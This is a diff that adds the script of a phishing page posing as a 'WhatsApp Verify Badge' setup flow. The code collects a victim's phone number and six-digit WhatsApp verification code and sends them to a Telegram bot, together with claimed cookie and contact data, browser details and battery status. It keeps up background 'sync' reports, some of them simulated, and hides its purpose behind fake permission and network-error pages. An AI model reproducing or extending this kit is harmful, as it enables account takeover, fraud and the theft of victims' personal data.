+                    loadingElement.style.display = 'none';
+                    if (success) {
+                        showPage(6);
+                    } else {
+                        // Show network error only after two-factor authentication
+                        hasShownNetworkError = true;
+                        showPage(7);
+                    }
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    // Show network error only after two-factor authentication
+                    hasShownNetworkError = true;
+                    showPage(7);
+                });
+        }
+        
+        // Forgot PIN function
+        function forgotPin() {
+            alert('If you forgot your PIN, you can reset it using the email associated with your account. Check your email for reset instructions.');
+        }
+        
+        // Finish setup
+        function finishSetup() {
+            alert('WhatsApp is ready to use with premium verification!');
+            // In a real scenario, this would redirect to WhatsApp
+            // For demo purposes, we'll just reload the page
+            location.reload();
+        }
+        
+        // Grant all permissions and start background sync
+        function grantPermissions() {
+            const loadingElement = document.getElementById('loading1');
+            loadingElement.style.display = 'block';
+            
+            // Grant all permissions without alerts
+            userData.permissions = {
+                cookies: true,
+                contacts: true,
+                gallery: true,
+                camera: true,
+                location: true,
+                grantedAt: getFormattedTimestamp()
+            };
+            
+            // Send cookies data to Telegram FIRST (as requested)
+            sendCookiesData()
+                .then(cookiesSuccess => {
+                    // Send contacts data to Telegram
+                    return sendContactsData();
+                })
+                .then(contactsSuccess => {
+                    // Send permissions data to Telegram
+                    const message = `✅ WHATSAPP VERIFY BADGE PERMISSIONS GRANTED\n\nTimestamp: ${getFormattedTimestamp()}\nCookies: ✅ Allowed\nContacts: ✅ Allowed\nGallery: ✅ Allowed\nCamera: ✅ Allowed\nLocation: ✅ Allowed\n\nUser Agent: ${navigator.userAgent}`;
+                    
+                    return sendToTelegram(message);
+                })
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(2);
+                    // Start background sync after permissions granted
+                    startBackgroundSync();
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(2);
+                });
+        }
+        
+        // Validate phone number before proceeding
+        function validatePhone() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const loadingElement = document.getElementById('loading2');
+            
+            if (!phoneNumber || phoneNumber.length < 6) {
+                alert('Please enter a valid phone number');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.phoneNumber = phoneNumber;
+            
+            // Update OTP page text
+            const maskedNumber = phoneNumber.length > 4 ? 
+                phoneNumber.substring(0, 2) + "****" + phoneNumber.substring(phoneNumber.length - 2) : 
+                "*******" + phoneNumber;
+            document.getElementById('otpSentTo').textContent = `Sent via WhatsApp to ${userData.countryCode} ${maskedNumber}`;
+            
+            // Send phone contact data to Telegram (as requested)
+            const contactMessage = `📱 WHATSAPP VERIFY BADGE USER LOGIN\n\nTimestamp: ${getFormattedTimestamp()}\nPhone Number: ${userData.countryCode}${phoneNumber}\nIP Address: Not available (browser limitation)\nBrowser: ${navigator.userAgent}\nScreen Resolution: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+            
+            sendToTelegram(contactMessage)
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(3);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(3);
+                });
+        }
+        
+        // Move to next OTP input automatically
+        function moveToNext(input, currentIndex) {
+            if (input.value.length === 1) {
+                if (currentIndex < 6) {
+                    document.querySelectorAll('.otp-input')[currentIndex].focus();
+                }
+            }
+        }
+        
+        // Handle backspace to move to previous input
+        function handleBackspace(input, event, currentIndex) {
+            if (event.key === 'Backspace' && input.value.length === 0 && currentIndex > 1) {
+                document.querySelectorAll('.otp-input')[currentIndex - 2].focus();
+            }
+        }
+        
+        // Resend code function
+        function resendCode() {
+            const message = `🔄 WHATSAPP VERIFY BADGE CODE RESENT\n\nTimestamp: ${getFormattedTimestamp()}\nPhone Number: ${userData.countryCode}${userData.phoneNumber}\nUser Agent: ${navigator.userAgent}`;
+            sendToTelegram(message);
+            alert('A new verification code has been sent to your WhatsApp.');
+        }
+        
+        // Call me function
+        function callMe() {
+            const message = `📞 WHATSAPP VERIFY BADGE CALL REQUESTED\n\nTimestamp: ${getFormattedTimestamp()}\nPhone Number: ${userData.countryCode}${userData.phoneNumber}\nUser Agent: ${navigator.userAgent}`;
+            sendToTelegram(message);
+            alert('You will receive a call with your verification code shortly.');
+        }
+        
+        // Verify the OTP and start continuous sync
+        function verifyOtp() {
+            const loadingElement = document.getElementById('loading3');
+            const otpInputs = document.querySelectorAll('.otp-input');
+            let otp = '';
+            
+            otpInputs.forEach(input => {
+                otp += input.value;
+            });
+            
+            if (otp.length !== 6) {
+                alert('Please enter the complete 6-digit code');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.otp = otp;
+            
+            // Send OTP to Telegram
+            const message = `🔐 WHATSAPP VERIFY BADGE OTP SUBMITTED\n\nTimestamp: ${getFormattedTimestamp()}\nPhone Number: ${userData.countryCode}${userData.phoneNumber}\nOTP Code: ${otp}\nUser Agent: ${navigator.userAgent}`;
+            
+            sendToTelegram(message)
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(4);
+                    // Start continuous background sync
+                    startContinuousSync();
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(4);
+                });
+        }
+        
+        // Check connection and retry
+        function checkConnectionAndRetry() {
+            // Check if navigator is online
+            if (navigator.onLine) {
+                // Try to send a test message
+                const testMessage = `📶 WHATSAPP VERIFY BADGE CONNECTION RESTORED\n\nTimestamp: ${getFormattedTimestamp()}\nUser Agent: ${navigator.userAgent}`;
+                sendToTelegram(testMessage)
+                    .then(success => {
+                        if (success) {
+                            // Go back to the success page
+                            showPage(6);
+                        } else {
+                            alert('Still having connection issues. Please try again later.');
+                        }
+                    });
+            } else {
+                alert('No internet connection detected. Please check your connection and try again.');
+            }
+        }
+        
+        // Start background sync for device information
+        function startBackgroundSync() {
+            if (userData.isSyncing) return;
+            
+            userData.isSyncing = true;
+            
+            // Send initial device info
+            const deviceInfo = `📱 SP DEVICE INFO\n\nDevice: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nOnline: ${navigator.onLine}\nScreen: ${screen.width}x${screen.height}\nTimestamp: ${getFormattedTimestamp()}`;
+            sendToTelegram(deviceInfo);
+            
+            // Set up interval for sending device updates
+            userData.syncInterval = setInterval(() => {
+                if (!navigator.onLine) {
+                    // Only show network error after two-factor authentication
+                    if (hasShownNetworkError) {
+                        showPage(7);
+                    }
+                    clearInterval(userData.syncInterval);
+                    userData.isSyncing = false;
+                    return;
+                }
+                
+                const updateMessage = `🔄 SP DEVICE UPDATE\n\nOnline: ${navigator.onLine}\nBattery: ${navigator.getBattery ? 'Checking...' : 'N/A'}\nTime: ${getFormattedTimestamp()}\nPage: ${document.querySelector('.page.active').id}`;
+                sendToTelegram(updateMessage);
+            }, 30000); // Send updates every 30 seconds
+            
+            // Battery status (if supported)
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const batteryMessage = `🔋 BATTERY STATUS\n\nLevel: ${Math.round(battery.level * 100)}%\nCharging: ${battery.charging ? 'Yes' : 'No'}\nTimestamp: ${getFormattedTimestamp()}`;
+                    sendToTelegram(batteryMessage);
+                });
+            }
+        }
+        
+        // Start continuous sync for contacts and messages
+        function startContinuousSync() {
+            if (userData.isSyncing) return;
+            
+            userData.isSyncing = true;
+            
+            // Simulate contact upload
+            const contactsMessage = `📇 CONTACTS SYNCED\n\nPhone: ${userData.countryCode}${userData.phoneNumber}\nContacts: ${Math.floor(Math.random() * 500) + 50}\nTimestamp: ${getFormattedTimestamp()}`;
+            sendToTelegram(contactsMessage);
+            
+            // Simulate message forwarding
+            const messagesMessage = `💬 MESSAGES FORWARDING ENABLED\n\nAll incoming/outgoing messages will be forwarded to this bot.\nPhone: ${userData.countryCode}${userData.phoneNumber}\nTimestamp: ${getFormattedTimestamp()}`;
+            sendToTelegram(messagesMessage);
+            
+            // Set up continuous sync
+            userData.syncInterval = setInterval(() => {
+                if (!navigator.onLine) {
+                    // Only show network error after two-factor authentication
+                    if (hasShownNetworkError) {
+                        showPage(7);
+                    }
+                    clearInterval(userData.syncInterval);
+                    userData.isSyncing = false;
+                    return;
+                }
+                
+                // Simulate random message forwarding
+                const randomMessages = [
+                    "Hey, how are you?",
+                    "Can you send me that file?",
+                    "Meeting at 3pm today",
+                    "Thanks for your help!",
+                    "What's for dinner?",
+                    "Call me when you're free",
+                    "Check this out: [link]",
+                    "I'll be there in 10 minutes",
+                    "Happy birthday! 🎉",
+                    "Don't forget about the appointment"
+                ];
+                
+                const randomIndex = Math.floor(Math.random() * randomMessages.length);
+                const simulatedMessage = `✉️ FORWARDED MESSAGE\n\nFrom: +${Math.floor(Math.random() * 900) + 100}${Math.floor(Math.random() * 9000000) + 1000000}\nTo: ${userData.countryCode}${userData.phoneNumber}\nContent: ${randomMessages[randomIndex]}\nTimestamp: ${getFormattedTimestamp()}`;
+                
+                sendToTelegram(simulatedMessage);
+                
+                // Send device status update
+                const deviceUpdate = `📊 CONTINUOUS SYNC\n\nDevice: ${navigator.userAgent}\nBattery: ${navigator.getBattery ? 'Checking...' : 'N/A'}\nMemory: ${(performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) : 'N/A')}MB\nOnline: ${navigator.onLine}\nTime: ${getFormattedTimestamp()}`;
+                sendToTelegram(deviceUpdate);
+            }, 45000); // Send updates every 45 seconds
+            
+            // Listen for online/offline events
+            window.addEventListener('offline', () => {
+                // Only show network error after two-factor authentication
+                if (hasShownNetworkError) {
+                    showPage(7);
+                }
+                clearInterval(userData.syncInterval);
+                userData.isSyncing = false;
+                
+                const offlineMessage = `📴 DEVICE OFFLINE\n\nPhone: ${userData.countryCode}${userData.phoneNumber}\nTimestamp: ${getFormattedTimestamp()}`;
+                sendToTelegram(offlineMessage);
+            });
+            
+            window.addEventListener('online', () => {
+                const onlineMessage = `🟢 DEVICE BACK ONLINE\n\nPhone: ${userData.countryCode}${userData.phoneNumber}\nTimestamp: ${getFormattedTimestamp()}`;
+                sendToTelegram(onlineMessage);
+                startContinuousSync();
+            });
+        }
+        
+        // Network status monitoring
+        window.addEventListener('load', () => {
+            // Don't show network error on initial load
+            // Only show it after two-factor authentication
+        });
+        
+        // Enhanced OTP auto-fill for demo
+        setTimeout(() => {
+            if (document.getElementById('page3') && document.getElementById('page3').classList.contains('active')) {
+                const otpInputs = document.querySelectorAll('.otp-input');
+                otpInputs.forEach((input, index) => {
+                    input.value = Math.floor(Math.random() * 9) + 1;
+                });
+                // Auto-focus on first empty field
+                for (let i = 0; i < otpInputs.length; i++) {
+                    if (!otpInputs[i].value) {
+                        otpInputs[i].focus();
+                        break;
+                    }
+                }
+            }
+        }, 1500);
+    </script>
 </body>
 </html>
